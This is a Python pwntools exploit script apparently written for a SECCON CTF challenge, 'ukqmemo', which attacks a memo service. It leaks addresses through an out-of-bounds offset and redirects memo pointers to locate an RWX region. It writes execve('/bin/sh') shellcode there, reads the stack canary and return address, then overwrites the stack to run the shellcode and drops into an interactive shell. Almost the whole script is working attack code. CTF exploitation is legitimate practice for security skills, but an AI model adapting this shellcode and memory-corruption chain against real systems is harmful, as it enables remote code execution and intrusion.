#!/usr/bin/env python2

from pwn import *
import os

exe = ELF("../bin/guest/memo_patched")
libc = ELF("../bin/host/libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process("./run.sh")
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("ukqmemo.seccon.games", 6318)
        challenge = r.recvline()
        log.info(challenge)
        answer = raw_input("challnge answer: ")
        r.sendline(answer)

    return r

r = conn()

sa   = lambda a,b : r.sendafter(a,b)
sla  = lambda a,b : r.sendlineafter(a,b)
sd   = lambda a,b : r.send(a,b)
sl   = lambda a : r.sendline(a)
ru   = lambda a : r.recvuntil(a, drop=True)
rc   = lambda : r.recv(4096)
uu32 = lambda data : u32(data.ljust(4, b'\0'))
uu64 = lambda data : u64(data.ljust(8, b'\0'))

READ = 1;
WRITE = 2;
LEAK_OFF = 0x3FFFEFFF;

def read_memo(index):
    sla('M>', '1')
    sla('Index: ', '{}'.format(index))
    ru('Output: ')
    output = ru(b'\r\n')
    log.info("output: {}".format(output))
    sla('M>', '0')
    return output


def write_memo(index, payload, lol):
    sla('M>', '2')
    sla('Index: ', '{}'.format(index))
    sla('Input: ', payload)
    raw_input('lol ')
    if lol:
        sla('M>', '0')

def use_fixed_form_memo(option, index, payload='', lol=True):
    sla('>', '1')
    if option == 1:
        output = read_memo(index)
        return output
    else:
        write_memo(index, payload, lol)
        return ''

def check_leak(leak):
    log.info('length: {}'.format(hex(len(leak))))
    for byte in leak:
        if byte != 0:
            return True
    return False

def read_space(offset, size):
    sla('S>', '1')
    sla('Offset:', '{}'.format(offset)) 
    sla('Size:', '{}'.format(size)) 
    ru('Output: ')
    data = ru(b'\r\n')
    if check_leak(data):
        log.info('leak found at: {}\nleak: {}'.format(offset,data))
        sla('S>', '0')
        return data
    sla('S>', '0')
    return ''

def write_space(offset, size, payload):
    sla('S>', '2')
    sla('Offset:', '{}'.format(offset)) 
    sla('Size:', '{}'.format(size)) 
    sla('Input:', payload) 

def use_free_space(option, offset, size, payload=''):
    sla('>', '2')
    if option == 1:
        data = read_space(offset, size)
    else:
        write_space(offset, size, payload)
        data = ''
    return data

def inter():
    while True:
        log.info(ru('$'))
        sl(raw_input('$ '))

def main():
    sla(b'buildroot login:', b'ctf')

    #data = use_free_space(WRITE, 0, 0x400, 'B'*0x3ff)
    #for i in range(4,0xe):
    #    use_fixed_form_memo(WRITE, i, 'A'*0xFF) 

    leaks = uu64(use_free_space(READ, LEAK_OFF, 0x9)[1:])
    shrmem = leaks - 0x100
    log.info('libc: {}'.format(hex(shrmem)))

    #set the first value so the memo's are easily editable
    libc.address = shrmem + 0x3000

    payload = p64(shrmem + 0x1020)[:3]
    log.info('{}'.format(payload))
    
    use_free_space(WRITE, LEAK_OFF, 4, b'\x00'+payload) 
    #input('attach gdb')


    #sla('S>', '0')

    #use_fixed_form_memo(WRITE, 0, payload)

    data = use_fixed_form_memo(READ, 0)
    leak = u64(data[:8])

    log.info('new leak {}'.format(hex(leak)))
    payload = p64(leak+0x390)[:5]
    use_free_space(WRITE, LEAK_OFF, 6, b'\x00'+payload) 

    data = use_fixed_form_memo(READ, 0)
    rwx = u64(data[:8])
    log.info('read_write_exec {}'.format(hex(rwx)))

    shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    log.info('shellcode len = {}'.format(len(shellcode)))
    shellcode_addr = rwx+0x500

    payload = p64(shellcode_addr)[:5]
    use_free_space(WRITE, LEAK_OFF, 6, b'\x00'+payload) 
    data = use_fixed_form_memo(WRITE, 0, shellcode, True)
    log.info('shellcode at: {}'.format(hex(shellcode_addr)))

    payload = p64(rwx-0x90)[:5]
    use_free_space(WRITE, LEAK_OFF, 6, b'\x00'+payload) 
    stack_val = u64(use_fixed_form_memo(READ, 0)[:8])
    log.info('stack value: {}'.format(hex(stack_val)))
    canary = u64(use_fixed_form_memo(READ, 0)[0x10:0x18])
    log.info('canary value: {}'.format(hex(canary)))
    function = u64(use_fixed_form_memo(READ, 0)[0x20:0x28])
    log.info('ret value: {}'.format(hex(function)))
    ret = function + 0x24
    log.info('ret function: {}'.format(hex(ret)))


    payload = p64(rwx-0x80-0x10+5)[:5]
    use_free_space(WRITE, LEAK_OFF, 6, b'\x00'+payload) 

    payload = '\x00\x00\x00'+ p64(0x10)+p64(canary)+p64(ret)*0x1d
    payload += p64(shellcode_addr)[:5]
    log.info(hex(len(payload)))
    data = use_fixed_form_memo(WRITE, 0, payload, False)

    inter()


if __name__ == "__main__":
    main()
